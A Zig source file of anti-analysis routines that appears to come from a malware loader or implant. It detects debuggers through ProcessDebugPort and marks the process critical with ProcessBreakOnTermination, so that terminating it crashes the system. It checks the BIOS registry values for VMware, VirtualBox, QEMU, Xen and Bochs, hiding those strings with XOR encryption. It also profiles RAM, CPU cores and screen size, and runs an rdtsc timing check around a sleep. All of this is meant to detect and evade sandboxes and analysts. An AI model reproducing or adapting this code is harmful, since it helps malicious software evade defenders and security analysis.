const std = @import("std");
const types = @import("../types/types.zig");
const config = @import("config");
const engine = @import("../syscalls/engine.zig");
const dbg = @import("../syscalls/dbg.zig");
const hash = @import("../types/hash.zig");

const E = struct {
    pub const reg_bios_path = hash.xorEncrypt("\\Registry\\Machine\\HARDWARE\\DESCRIPTION\\System\\BIOS");
    pub const sys_manufacturer = hash.xorEncrypt("SystemManufacturer");
    pub const sys_product_name = hash.xorEncrypt("SystemProductName");
    pub const vm_manuf = struct {
        pub const v0 = hash.xorEncrypt("VMware");
        pub const v1 = hash.xorEncrypt("VirtualBox");
        pub const v2 = hash.xorEncrypt("innotek");
        pub const v3 = hash.xorEncrypt("QEMU");
        pub const v4 = hash.xorEncrypt("Xen");
        pub const v5 = hash.xorEncrypt("Bochs");
    };
    pub const vm_prod = struct {
        pub const v0 = hash.xorEncrypt("Virtual");
        pub const v1 = hash.xorEncrypt("VMware");
        pub const v2 = hash.xorEncrypt("VirtualBox");
        pub const v3 = hash.xorEncrypt("QEMU");
        pub const v4 = hash.xorEncrypt("Xen");
        pub const v5 = hash.xorEncrypt("Bochs");
    };
};

fn rdtsc() u64 {
    var lo: u32 = undefined;
    var hi: u32 = undefined;
    asm volatile("rdtsc"
        : [lo] "={eax}" (lo),
          [hi] "={edx}" (hi),
    );
    return (@as(u64, hi) << 32) | lo;
}

pub fn getTotalPhysicalRam() ?u64 {
    var info: types.SYSTEM_BASIC_INFORMATION = undefined;
    var ret_len: types.ULONG = 0;
    const status = engine.NtQuerySystemInformation(
        @intFromEnum(types.SYSTEM_INFORMATION_CLASS.SystemBasicInformation),
        @as(types.PVOID, @ptrCast(&info)),
        @sizeOf(types.SYSTEM_BASIC_INFORMATION),
        &ret_len,
    );
    if (status < 0) return null;
    return @as(u64, info.NumberOfPhysicalPages) * info.PageSize;
}

pub fn getCpuCoreCount() ?u8 {
    var info: types.SYSTEM_BASIC_INFORMATION = undefined;
    var ret_len: types.ULONG = 0;
    const status = engine.NtQuerySystemInformation(
        @intFromEnum(types.SYSTEM_INFORMATION_CLASS.SystemBasicInformation),
        @as(types.PVOID, @ptrCast(&info)),
        @sizeOf(types.SYSTEM_BASIC_INFORMATION),
        &ret_len,
    );
    if (status < 0) return null;
    return info.NumberOfProcessors;
}

pub fn checkDebugger() bool {
    var debug_port: types.ULONG = 0;
    var ret_len: types.ULONG = 0;
    const status = engine.NtQueryInformationProcess(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @intFromEnum(types.PROCESSINFOCLASS.ProcessDebugPort),
        @as(types.PVOID, @ptrCast(&debug_port)),
        @sizeOf(types.ULONG),
        &ret_len,
    );
    if (status < 0) return false;
    return debug_port != 0;
}

pub fn setBreakOnTermination(enable: bool) bool {
    var value: types.ULONG = if (enable) 1 else 0;
    const status = engine.NtSetInformationProcess(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @intFromEnum(types.PROCESSINFOCLASS.ProcessBreakOnTermination),
        @as(types.PVOID, @ptrCast(&value)),
        @sizeOf(types.ULONG),
    );
    return status >= 0;
}

pub fn checkScreenResolution() ?struct { w: u32, h: u32 } {
    const w = @as(u32, @intCast(engine.NtUserGetSystemMetrics(0)));
    const h = @as(u32, @intCast(engine.NtUserGetSystemMetrics(1)));
    if (w == 0 and h == 0) return null;
    return .{ .w = w, .h = h };
}

fn initUnicodeString(s: []const u8, buf: *[512]u16) types.UNICODE_STRING {
    @memset(buf, 0);
    for (s, 0..) |c, i| {
        buf[i] = c;
    }
    return .{
        .Length = @as(types.USHORT, @intCast(s.len * 2)),
        .MaximumLength = @as(types.USHORT, @intCast(buf.len * 2)),
        .Buffer = @as(types.PWSTR, @ptrCast(buf)),
    };
}

fn decryptIntoBuf(comptime enc: []const u8, buf: *[512]u16) []const u8 {
    var tmp: [enc.len]u8 = undefined;
    hash.xorDecrypt(enc, &tmp);
    for (tmp, 0..) |c, i| {
        buf[i] = c;
    }
    return tmp[0..];
}

pub fn checkRegistryVmIndicators() bool {
    var buf_us: [512]u16 = undefined;
    var buf_val: [512]u16 = undefined;
    var read_buf: [1024]u8 = undefined;

    var path_tmp: [E.reg_bios_path.len]u8 = undefined;
    hash.xorDecrypt(&E.reg_bios_path, &path_tmp);
    var us = initUnicodeString(path_tmp[0..], &buf_us);
    var oa = types.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
        .RootDirectory = null,
        .ObjectName = &us,
        .Attributes = types.OBJ_CASE_INSENSITIVE,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };

    var key_handle: types.HANDLE = undefined;
    const open_status = engine.NtOpenKey(
        &key_handle,
        types.KEY_QUERY_VALUE,
        @as(types.PVOID, @ptrCast(&oa)),
    );
    if (open_status < 0) return false;
    defer _ = engine.NtClose(key_handle);

    const vm_manuf = [_][]const u8{
        &blk: { var b: [E.vm_manuf.v0.len]u8 = undefined; hash.xorDecrypt(&E.vm_manuf.v0, &b); break :blk b; },
        &blk: { var b: [E.vm_manuf.v1.len]u8 = undefined; hash.xorDecrypt(&E.vm_manuf.v1, &b); break :blk b; },
        &blk: { var b: [E.vm_manuf.v2.len]u8 = undefined; hash.xorDecrypt(&E.vm_manuf.v2, &b); break :blk b; },
        &blk: { var b: [E.vm_manuf.v3.len]u8 = undefined; hash.xorDecrypt(&E.vm_manuf.v3, &b); break :blk b; },
        &blk: { var b: [E.vm_manuf.v4.len]u8 = undefined; hash.xorDecrypt(&E.vm_manuf.v4, &b); break :blk b; },
        &blk: { var b: [E.vm_manuf.v5.len]u8 = undefined; hash.xorDecrypt(&E.vm_manuf.v5, &b); break :blk b; },
    };
    const vm_prod = [_][]const u8{
        &blk: { var b: [E.vm_prod.v0.len]u8 = undefined; hash.xorDecrypt(&E.vm_prod.v0, &b); break :blk b; },
        &blk: { var b: [E.vm_prod.v1.len]u8 = undefined; hash.xorDecrypt(&E.vm_prod.v1, &b); break :blk b; },
        &blk: { var b: [E.vm_prod.v2.len]u8 = undefined; hash.xorDecrypt(&E.vm_prod.v2, &b); break :blk b; },
        &blk: { var b: [E.vm_prod.v3.len]u8 = undefined; hash.xorDecrypt(&E.vm_prod.v3, &b); break :blk b; },
        &blk: { var b: [E.vm_prod.v4.len]u8 = undefined; hash.xorDecrypt(&E.vm_prod.v4, &b); break :blk b; },
        &blk: { var b: [E.vm_prod.v5.len]u8 = undefined; hash.xorDecrypt(&E.vm_prod.v5, &b); break :blk b; },
    };

    var manuf_buf: [E.sys_manufacturer.len]u8 = undefined;
    hash.xorDecrypt(&E.sys_manufacturer, &manuf_buf);
    var prod_buf: [E.sys_product_name.len]u8 = undefined;
    hash.xorDecrypt(&E.sys_product_name, &prod_buf);

    return containsOneOf(key_handle, &manuf_buf, &vm_manuf, &buf_val, &read_buf) or
        containsOneOf(key_handle, &prod_buf, &vm_prod, &buf_val, &read_buf);
}

fn containsOneOf(
    key: types.HANDLE,
    value_name: []const u8,
    needles: []const []const u8,
    val_buf: *[512]u16,
    data_buf: *[1024]u8,
) bool {
    var vn = initUnicodeString(value_name, val_buf);
    var result_len: types.ULONG = 0;

    const status = engine.NtQueryValueKey(
        key,
        &vn,
        @intFromEnum(types.KEY_VALUE_INFORMATION_CLASS.KeyValuePartialInformation),
        @as(types.PVOID, @ptrCast(data_buf)),
        data_buf.len,
        &result_len,
    );
    if (status < 0) return false;

    const kvpi: *types.KEY_VALUE_PARTIAL_INFORMATION = @ptrCast(@alignCast(data_buf));
    const data = data_buf[@offsetOf(types.KEY_VALUE_PARTIAL_INFORMATION, "Data")..][0..kvpi.DataLength];

    for (needles) |needle| {
        if (data.len < needle.len * 2) continue;
        var i: usize = 0;
        while (i <= data.len - needle.len * 2) : (i += 2) {
            var matches = true;
            for (needle, 0..) |nc, j| {
                const dc = data[i + j * 2];
                if (dc != nc and dc != nc ^ 32) {
                    matches = false;
                    break;
                }
            }
            if (matches) return true;
        }
    }
    return false;
}

pub fn checkTimingAnomaly() bool {
    const interval: types.LARGE_INTEGER = -@as(types.LARGE_INTEGER, @intCast(200 * 10000));
    const t0 = rdtsc();
    _ = engine.NtDelayExecution(0, @as(*types.LARGE_INTEGER, @constCast(&interval)));
    const t1 = rdtsc();
    return (t1 -% t0) < config.VM_TIMING_ANOMALY_TSC;
}

test "checkRegistryVmIndicators no crash" {
    _ = checkRegistryVmIndicators();
}

test "rdtsc returns different values" {
    const a = rdtsc();
    const b = rdtsc();
    try std.testing.expect(a != b);
}
